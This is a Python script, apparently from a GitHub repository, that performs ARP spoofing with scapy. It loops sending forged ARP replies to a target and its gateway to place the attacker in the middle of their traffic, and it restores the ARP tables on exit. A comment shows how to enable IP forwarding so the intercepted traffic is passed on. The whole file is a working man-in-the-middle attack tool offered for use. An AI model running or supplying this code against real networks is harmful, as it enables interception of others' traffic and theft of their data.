#!/usr/bin/env python
# 
# echo 1 > /proc/sys/net/ipv4/ip_forward    #to enable ip forwarding through linux machine
# print(list.show())
# print(list.summary())
# 
# 
# Code to spoof ARP tables
# This code needs two dependencies: scapy, time and sys
# You need a linux system
# for more documentation visit my github page: github.com/nibrasmuhamed
# pull requests, always welcome
# code published under MIT LICENSE
#           
#               code contributed by: @nibrasmuhamed and @muhammednahil on Github
#                       



import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_lst = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answered_lst[0][1].hwsrc

def spoof(target, spoof_ip):
    target_mac = get_mac(target)
    list = scapy.ARP(op=2, pdst = target, hwdst =target_mac , psrc = spoof_ip)
    scapy.send(list, verbose=False)

def restore(dist_ip, source_ip):
    dist_mac= get_mac(dist_ip)
    source_mac = get_mac(source_ip)
    packet= scapy.ARP(op=2, pdst= dist_ip, hwdst=dist_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    #print(packet.show())
    #print(packet.summary())

target_ip = "ip"
gateway_ip = "gateway_ip"

sent_packets = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print("\r[+] Send two packets: " + str(sent_packets)),
        sys.stdout.flush()
        sent_packets = sent_packets + 1
        time.sleep(2)
except KeyboardInterrupt:
    print("\nProcess killed by user\nsee you again!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
except IndexError:
    print("\nTry again")
except:
    print("Run with sudo")


